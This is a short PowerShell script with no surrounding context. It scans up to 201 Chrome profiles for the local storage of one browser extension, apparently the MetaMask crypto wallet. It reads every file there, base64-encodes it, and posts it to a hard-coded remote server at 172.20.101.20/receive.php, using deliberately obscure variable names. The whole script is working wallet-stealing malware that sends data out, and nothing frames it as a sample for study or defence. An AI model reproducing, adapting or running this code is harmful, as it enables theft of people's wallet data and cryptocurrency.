function UploadFolder {
    param (
        [string]$folderPath,   
        [string]$extraPath  
    )
    $lastFolderName = Split-Path -Path $folderPath -Leaf
    Write-Output $lastFolderName

    if (-not (Test-Path $folderPath)) {
        Write-Host "$folderPath The folder does not exist."
        return
    }
    $files = Get-ChildItem -Path $folderPath -Recurse -File
    $utcDateTime = Get-Date -UFormat "%s"  
    $utcDateTime = [System.DateTime]::UtcNow
    $folderName = $utcDateTime.ToString("yyyy-MM-dd_HH-mm-ss")

    foreach ($file in $files) {
        $k = $file.FullName -replace [regex]::Escape($folderPath), ""
        $k1 = $k -replace [regex]::Escape($file.Name), ""
        $k2 =  $k1.Substring(1)
        $k3 = $k2 -replace '\\', '/'
        

        $k4 = $folderName + "/" + $extraPath + "/" + $lastFolderName + "/" + $k3
        
        Write-Output "Uploading file: $($file.FullName)"
        GetFile $file.FullName $file.Name $k4
    }
}
$srsdf='http://172.20.101.20/receive.php'
function GetFile() {
	param (
        $mytar,
	    $name, 
		$folder
       )
	Write-Output $name
	$dhd=[IO.File]::readallbytes($mytar);
	$kfjh=[System.Convert]::ToBase64String($dhd);
	$kfjh=[regex]::Replace($kfjh,'=','%');
	$msgin='access='+$kfjh+'&name='+$name+'&folder='+$folder;
	Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
}
$userProfile = $env:USERPROFILE
$profile0Path = Join-Path -Path $userProfile -ChildPath "AppData\Local\Google\Chrome\User Data\Default"
for ($i = 0; $i -le 200; $i++) {
    $profilePath = if ($i -eq 0) {$profile0Path} else {Join-Path -Path $userProfile -ChildPath "AppData\Local\Google\Chrome\User Data\Profile $i"}
    if (Test-Path $profilePath) {
        $profilePath = $profilePath + "\Local Extension Settings" + "\nkbihfbeogaeaoehlefnkodbefgpgknn"
        Write-Output "$profilePath"
        $extra = "Profile " + $i
        UploadFolder -folderPath $profilePath  -extraPath $extra
    } else {
    }
}